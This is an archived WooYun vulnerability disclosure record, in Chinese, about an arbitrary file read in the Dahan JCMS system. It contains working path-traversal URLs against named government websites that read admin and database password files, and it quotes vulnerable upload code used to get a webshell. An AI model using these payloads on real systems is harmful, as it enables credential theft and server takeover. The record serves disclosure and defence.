{"id": 49392, "wybug_id": "wooyun-2014-074283", "wybug_title": "大汉版通系统任意文件读取getshell", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "路人甲", "wybug_date": "2014-08-29 10:20", "wybug_open_date": "2014-11-24 10:22", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "文件操作参数未加过滤", "敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-29：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向公众公开  简要描述： 大汉版通系统任意文件读取getshell 详细说明：  大汉版通jcms系统任意文件读取，可以直接获取管理员账号，密码明文、数据库密码明文、配置信息等非常敏感的信息,可以轻松实现无任何限制获取webshell...漏洞出现在以下连接：/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp1）获取管理员密码明文http://anxiang.gov.cn/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename=../../../../../../WEB-INF/ini/merpserver.ini\n\n2）获取数据库密码明文\n\n3）获取配置文件敏感信息http://www.wugang.gov.cn/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename=../../../../../../WEB-INF/web.xml\n\n获取管理员密码后，可直接通过截断获取shell,缺陷代码如下\nif(request.getMethod().toUpperCase().equals(\"POST\")){   \t\t\tJcms_UpdaterecordBLF blf = new Jcms_UpdaterecordBLF(\"1\");\t\tJcms_Update_RecordEntity entity = new Jcms_Update_RecordEntity();\t\t//解压路径\t\tString strFilePath = strSysPath + \"/update/\";\t\t\t\t//zip文件上传的临时目录\t\tString strTemp = strFilePath + \"temp/\";\t\t\t\tConvert.createDirectory(strTemp);\t        //建立上传\t\tupload = new CommonUploadFile( strTemp ,\"\");\t\t\t\t\t   try{            //上传zip包\t\t\t\t\tboolean bResult = upload.uploadFile(request);\t\t\t\t\t\tString[] strFileName = upload.getAllFileName();\t\t\t\t\t\tstrBakPath = upload.getFormValue(\"vc_bakPath\");\t\t\tstrBakPath = Convert.getValue(strBakPath);\t\t\tstrBakPath = (strBakPath.trim().length() == 0) ? strFilePath : strBakPath;\t\t\t\t\tstrBakPath = strBakPath.replaceAll(\"\\\\\\\\\",\"/\");\t\t\tif(strBakPath.endsWith(\"/\") || strBakPath.endsWith(\"\\\\\"))\t\t\t\tstrBakPath = strBakPath.substring(0,strBakPath.length()-1);\t\t\tstrBakPath = strBakPath+\"/bak/\";\t\t\t//创建备份目录\t\t\tConvert.createDirectory(strBakPath);           \t\t\tZipFile zip = new ZipFile();\t\t\t//解压zip包\t\t    boolean  bl = zip.unzip( true,strTemp + strFileName[0].trim(),strFilePath );\t\t\t\t\t\t\tString strDate = DateFormat.getStrCurrentDate(DateFormat.LONG_DATE_TIME);\t\t\t\t\t\t//zip包名\t\t\tString strZipName = strFileName[0].substring(0,strFileName[0].lastIndexOf(\".zip\"));\t\t\t \t\t\t if( bResult && bl){\t\t\t\t entity.setVc_packagename(strZipName);\t\t\t\t entity.setVc_spath(strFilePath);\t\t\t\t entity.setVc_bpath(strBakPath);\t\t\t\t entity.setC_createtime(strDate);\t\t\t\t entity.setI_flag(1);\t\t\t\t entity.setVc_status(\"未执行\");\t\t\t\t entity.setB_cancel(0);\t\t\t\t bl = blf.doInsert(entity);\t\t\t }\t\t\t \t\t\t if( !bl ){\t\t\t\t  LogWriter.error( \"ERROR: mark record!\" );\t\t\t  }else{\t\t\t\t  //删除上传的zip文件\t\t\t\t  jcms.util.FileUtil.deleteFolder(strTemp);\t\t\t  }\t       }catch(Exception e){\t    \t   LogWriter.error(\"ERROR: \"+e.toString());\t        }   \t       out.println(Convert.getAlterScript(\"alert('上传成功！');\"));\t       out.println(Convert.getAlterScript(\"top.location.reload();\"));\t\t\treturn;\t }// End if%>\n   漏洞证明：  得到管理员密码后，获取到shell截图如下\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-24 10:22 厂商回复： 问题重复，已经在新版本中修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-29 10:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  早日公开求围观    \n     2014-08-29 11:33 |    \t\tGsAn \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | Whoami)\t\t \n  这个叼    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}